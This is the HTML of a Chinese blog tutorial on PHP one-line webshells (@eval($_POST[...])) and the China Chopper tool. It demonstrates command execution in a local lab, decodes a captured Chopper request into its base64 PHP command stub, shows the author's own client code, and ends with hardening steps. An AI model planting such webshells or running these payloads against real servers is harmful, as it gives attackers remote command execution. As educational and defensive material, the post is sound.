@@ -1,0 +1,226 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PHP一句话木马 | 周末的游戏之旅</title><meta name="author" content="周末"><meta name="copyright" content="周末"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="引言未知攻，焉知防。本文仅用来研究及学习PHP一句话木马及中国菜刀软件的原理及防御。  ##什么是PHP一句话木马还是以栗子说明： 上图是一个最简单的PHP一句话木马。简单的解释一下：@不在前端网页显示报错信息eval()函数 — 把字符串作为PHP代码执行.$_POST[&#39;abcd&#39;] 创建一个名为abcd的变量，通过_POST请求传入数据这么简单的一句话可以产生什么效果呢？ 举">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP一句话木马">
+<meta property="og:url" content="https://yongshen.me/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/index.html">
+<meta property="og:site_name" content="周末的游戏之旅">
+<meta property="og:description" content="引言未知攻，焉知防。本文仅用来研究及学习PHP一句话木马及中国菜刀软件的原理及防御。  ##什么是PHP一句话木马还是以栗子说明： 上图是一个最简单的PHP一句话木马。简单的解释一下：@不在前端网页显示报错信息eval()函数 — 把字符串作为PHP代码执行.$_POST[&#39;abcd&#39;] 创建一个名为abcd的变量，通过_POST请求传入数据这么简单的一句话可以产生什么效果呢？ 举">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yongshen.me/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/1.png">
+<meta property="article:published_time" content="2022-01-07T08:27:29.000Z">
+<meta property="article:modified_time" content="2022-01-07T08:45:45.627Z">
+<meta property="article:author" content="周末">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yongshen.me/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/1.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yongshen.me/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.js" defer></script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: {"appId":"P3N9CZFE6F","apiKey":"9ccde94c5577c0ce1f54667c110a1127","indexName":"9ccde94c5577c0ce1f54667c110a1127","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PHP一句话木马',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-07 16:45:45'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">周末的游戏之旅</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">PHP一句话木马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-07T08:27:29.000Z" title="发表于 2022-01-07 16:27:29">2022-01-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-07T08:45:45.627Z" title="更新于 2022-01-07 16:45:45">2022-01-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PHP一句话木马"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>未知攻，焉知防。本文仅用来研究及学习PHP一句话木马及中国菜刀软件的原理及防御。</p>
+<hr>
+<p>##什么是PHP一句话木马<br>还是以栗子说明：<br><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/1.png"></p>
+<p>上图是一个最简单的PHP一句话木马。简单的解释一下：<br><code>@</code>不在前端网页显示报错信息<br><code>eval()</code>函数 — 把字符串作为PHP代码执行.<br><code>$_POST[&#39;abcd&#39;]</code> 创建一个名为abcd的变量，通过_POST请求传入数据<br>这么简单的一句话可以产生什么效果呢？</p>
+<p>举另一个栗子，来看一下：<br>1.搭建一个php网站环境，为了方便我用的PHPStudy，然后创建一个新的PHP文件，将上图代码写入并保存。<br><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/2.png"></p>
+<p>2.访问一下，好像并没有什么异常</p>
+<p>3.然后以非正常姿势访问一下。发送一个POST请求，我使用的是Firefox浏览的hackbar插件（强烈推荐非常好用），hackbar可以在Firefox 插件商店下载，当然也可以用Burp发包不过我感觉比较麻烦。<br>使用Firefox访问测试页面，按F12键，选择HackBar<br><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/3.png"></p>
+<p>4.点击Load URL，载入当前访问的地址<br><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/4.png"></p>
+<p>5.勾选Post data，输入abcd=phpinfo();,点击Execute执行一下。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">abcd=phpinfo();</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/5.png"></p>
+<p>6.phpinfo()函数已经执行，并在前端显示出来了。好像并没有什么猪皮用？，来试试输入一下下面的代码并执行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">abcd=system(calc);</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/6.png"></p>
+<p>7.？？？计算器怎么弹出来了？在搞些蛇皮？解释一下：<br><code>system()</code> 函数-执行系统命令<br><code>calc</code> CMD命令打开计算器<br>当把这个POST传到服务器时，相当于在服务器上执行了下面这段代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="string">&#x27;system(calc);&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上面解释过eval()函数的作用：将字符串当作PHP代码执行。也就是说，利用这两个函数我们就可以在服务器上为所欲为之为所欲为了（又加快了入狱速度，很开心？）。</p>
+<hr>
+<h2 id="什么是中国菜刀"><a href="#什么是中国菜刀" class="headerlink" title="什么是中国菜刀"></a>什么是中国菜刀</h2><p>中国菜刀是一款专业的“网站管理”软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行“管理”！在非简体中文环境下使用，自动切换到英文界面。UINCODE方式编译，支持多国语言输入显示。—-某百科说的，不是我说的！<br>支持的服务端脚本：PHP, ASP，.NET。<br>可以理解为一个封装好的eval()函数加system()的POST请求利用工具，常常被一些黑客用作非法用途。</p>
+<hr>
+<h2 id="分析中国菜刀的POST请求信息"><a href="#分析中国菜刀的POST请求信息" class="headerlink" title="分析中国菜刀的POST请求信息"></a>分析中国菜刀的POST请求信息</h2><p>1.首先，打开Wireshark监听一下网卡。<br><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/7.png"></p>
+<p>2.用菜刀给靶机弹个计算器<br><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/8.png"></p>
+<p>3.找到刚才菜刀发出去的包<br><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/9.png"></p>
+<p>4.把数据粘贴出来看一下，好像看到了eval?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abcd=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3Jz</span><br><span class="line">IiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNl</span><br><span class="line">NjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWR</span><br><span class="line">VJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwf</span><br><span class="line">SB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC</span><br><span class="line">0iKTtkaWUoKTs%3D&amp;z1=Y21k&amp;z2=Y2QgL2QgIkM6XHBocFN0dWR5XFBIUFR1dG9yaWFsXFdXV1wiJmNhbGMmZWNobyBb</span><br><span class="line">U10mY2QmZWNobyBbRV0%3D</span><br></pre></td></tr></table></figure>
+<p>5.Wireshark复制出来的是还没经过URL解码的，解码看一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abcd=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1p</span><br><span class="line">dCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk\</span><br><span class="line">7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdK</span><br><span class="line">TskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4m</span><br><span class="line">MSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs=&amp;z1=Y21k&amp;z2=Y2Q</span><br><span class="line">gL2QgIkM6XHBocFN0dWR5XFBIUFR1dG9yaWFsXFdXV1wiJmNhbGMmZWNobyBbU10mY2QmZWNobyBbRV0=</span><br></pre></td></tr></table></figure>
+<p>6.好像看到了z0、z1、z2三个变量？整理一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abcd=@eval(base64_decode($_POST[z0]));</span><br><span class="line">&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50a</span><br><span class="line">W1lKDApO2VjaG8oIi0+fCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbIn</span><br><span class="line">oyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyB</span><br><span class="line">cInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIK</span><br><span class="line">cmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs=</span><br><span class="line">&amp;z1=Y21k</span><br></pre></td></tr></table></figure>
+<p>7.看起来z0、z1、z2三个变量的值经过Base64编码了，解一下码看看：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">abcd=@<span class="keyword">eval</span>(base64_decode(<span class="variable">$_POST</span>[z0]));</span><br><span class="line">&amp;z0=@ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);@set_magic_quotes_runtime(<span class="number">0</span>);<span class="keyword">echo</span>(<span class="string">&quot;-</span></span><br><span class="line"><span class="string">&gt;|&quot;</span>);;<span class="variable">$p</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;z1&quot;</span>]);<span class="variable">$s</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;z2&quot;</span>]);<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);$</span><br><span class="line">c=substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;<span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;@system(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>,<span class="variable">$ret</span>);<span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;</span></span><br><span class="line"><span class="string">ret=<span class="subst">&#123;$ret&#125;</span></span></span><br><span class="line"><span class="string">&quot;</span>:<span class="string">&quot;&quot;</span>;;<span class="keyword">echo</span>(<span class="string">&quot;|&lt;-&quot;</span>);<span class="keyword">die</span>();</span><br><span class="line">&amp;z1=cmd</span><br><span class="line">&amp;z2=cd /d <span class="string">&quot;C:\phpStudy\PHPTutorial\WWW\&quot;&amp;calc&amp;echo [S]&amp;cd&amp;echo [E]</span></span><br></pre></td></tr></table></figure>
+<p>8.整理一下，把图片保存下来看更清晰：<br><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/10.png"><br>&amp;z2经过上面的判断处理后成为:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/c &amp;cd /d &quot;C:\phpStudy\PHPTutorial\WWW\&quot;&amp;calc&amp;echo [s]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>
+<p>&amp;z1和&amp;z2拼接起来后是一条完整的CMD命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd /c &amp;cd /d &quot;C:\phpStudy\PHPTutorial\WWW\&quot;&amp;calc&amp;echo [s]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>
+<p>/c 参数，执行完命令后关闭命令窗口<br>&amp; 在一条语句中执行多个命令<br>/d 直接进入指定目录<br>cd 不带参数和选项，输出当前物理路径<br>这句命令解释为：打开cmd，执行cd入后面的目录，calc弹出计算器，echo出标之符[s]，打印出当前目录，echo出标志符[E]</p>
+<p>为什么要echo出标识符[S][E]，有什么用呢？<br>很多情况下一句话木马是嵌入到某些页面中的，也就是页面输出内容除了命令执行结果还有网页中的其他内容，这就需要在Request爬取页面后用正则匹配或其他方式找到我们想要的命令执行结果。这里的[S][E]只是要匹配出&amp;cd命令的执行结果，前面还有echo(“|&gt;-“)echo(“|&lt;-“),是为了匹配出我们想要的所有结果。</p>
+<p>两个标识符[S][E]中间为什么要打印出当前目录？<br>这就要从程序实现上解释了，当我们不考虑路径时，我们可以使用system()执行任何想要的命令。但由于PHP的特性，在页面执行完毕后对应的程序生命周期也就结束了，变量会被重置，举个栗子：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$i</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$i</span>++;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当我们第一次打开页面时，代码从上到下执行，页面输出2，该页面的程序生命周期结束。当我们刷新页面时，程序重新进入生命周期，依然是从上到下执行，输出2。<br>当我们执行<code>cd ..</code>这种更改路径的命令时，网页执行命令，进入上级路径C:\phpStudy\PHPTutorial。<code>cd ..</code>是根据相对路径执行的，也就是相对于网页文件的目录。但是，当我们下次再执行cd ..命令时，由于PHP的特性，依然是从网页文件所在目录执行 <code>cd ..</code> 。<br>所以我们要保存下来cd ..的执行结果，也就是&amp;cd打印出来然后保存下来，然后配合命令前半部分的 <code>cmd /c &amp;amp;cd /d &quot;C:\phpStudy\PHPTutorial\WWW\&quot; </code>,把其中的路径当作一个参数，下次执行时只需要将打印保存下来的路径作为参数填到命令中，就像这样<code>cmd /c &amp;amp;cd /d &quot;C:\phpStudy\PHPTutorial\&quot; </code>完解决了路径问题。<br>（菜刀作者写的PHP代码和Shell是真的骚）。</p>
+<hr>
+<h1 id="实现简单的菜刀"><a href="#实现简单的菜刀" class="headerlink" title="实现简单的菜刀"></a>实现简单的菜刀</h1><p>中国菜刀的工作原理大致可分为三个步骤：</p>
+<ol>
+<li>构造POST请求</li>
+<li>发送POST请求并爬取页面信息</li>
+<li>处理信息（包括获取命令执行结果，以及更新路径）</li>
+</ol>
+<p>首先看一下构造POST请求的轮子长什么样，先上代码：<br>和python中的Requests包类似，也是用字典构造请求参数。<br><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/11.png"></p>
+<p>然后看一下发送POST请求并爬取页面的轮子：<br><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/12.png"></p>
+<p>最后处理信息就需要自己发明轮子了：<br>我的PHP代码只有一句话很简单（骚不过，骚不过）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> phpCode = <span class="keyword">string</span>.Format(<span class="string">&quot;echo &#x27; [h2o]&#x27;; @eval(<span class="subst">$_POST</span>[z0]); &amp;z0=<span class="subst">$r</span>=base64_decode(<span class="subst">$_POST</span>[z1]); @system(<span class="subst">$r</span>,<span class="subst">$ret</span>); </span></span><br><span class="line"><span class="string">if(<span class="subst">$ret</span>!=0) echo <span class="subst">$ret</span>;echo &#x27;[h2o] &#x27;; &amp;z1=&#123;0&#125;&quot;</span>, cmd);  <span class="comment">//php代码</span></span><br></pre></td></tr></table></figure>
+<p>因为初始化的时候需要先获取路径，获取路径只需要执行php的<code>getcwd()</code>方法即可，所以我发明了两个轮子，一个执行PHP代码的轮子，一个执行CMD命令的轮子。为什么要这么做呢？因为这样不论我执行PHP代码还是CMD命令，只需要调用相应的方法传入参数就可以了。<br><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/13.png"><br><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/14.png"></p>
+<h1 id="正文，如何防范PHP一句话木马"><a href="#正文，如何防范PHP一句话木马" class="headerlink" title="正文，如何防范PHP一句话木马"></a>正文，如何防范PHP一句话木马</h1><p>方法一：Windows下，Apache默认是System权限运行，哇贼恐怖！我们来给Apache降降权吧。执行下面的命令。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net user apache fuckmicrosoft /add #新建一个用户，用户名apache,密码fuckmicrosoft</span><br><span class="line">net localgroup users apache /del #把apache用户从users用户组中删除，这样apache就不属于任何用户组了</span><br></pre></td></tr></table></figure>
+<p>然后设置apache服务的账户:<br><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/15.png"></p>
+<p>方法二：禁用system、exec等可以执行webshell的方法。<br>1.打开php.ini<br>2.设置<code>disable_functions= passthru，exec，shell_exec，system</code></p>
+<p>方法三：修改httpd.conf，只允许php脚本程序在web目录里操作：<br><code>php_admin_value open_basedir web物理路径</code></p>
+<h2 id="方法四：待补充"><a href="#方法四：待补充" class="headerlink" title="方法四：待补充~"></a>方法四：待补充~</h2><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="http://www.php.net/docs.php">PHP官方API</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/accumulater/p/7110811.html">Windows CMD命令大全</a><br><a target="_blank" rel="noopener" href="http://houliang4285.iteye.com/blog/1687816">CMD /C 和CMD /k命令</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/gscaiyucheng/article/details/24911375">技术剖析中国菜刀原理</a><br><a target="_blank" rel="noopener" href="http://www.ifuryst.com/archives/caidao.html">中国菜刀原理浅分析</a><br><a target="_blank" rel="noopener" href="https://gitee.com/week233/Cknife">CKnife源码</a><br><a target="_blank" rel="noopener" href="https://gitee.com/week233/ARPAttack">牢底坐穿工具箱</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">周末</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yongshen.me/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">https://yongshen.me/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yongshen.me" target="_blank">周末的游戏之旅</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/01/07/hello-world/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Hello World</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div></div></div></div></div><div class="aside-content" 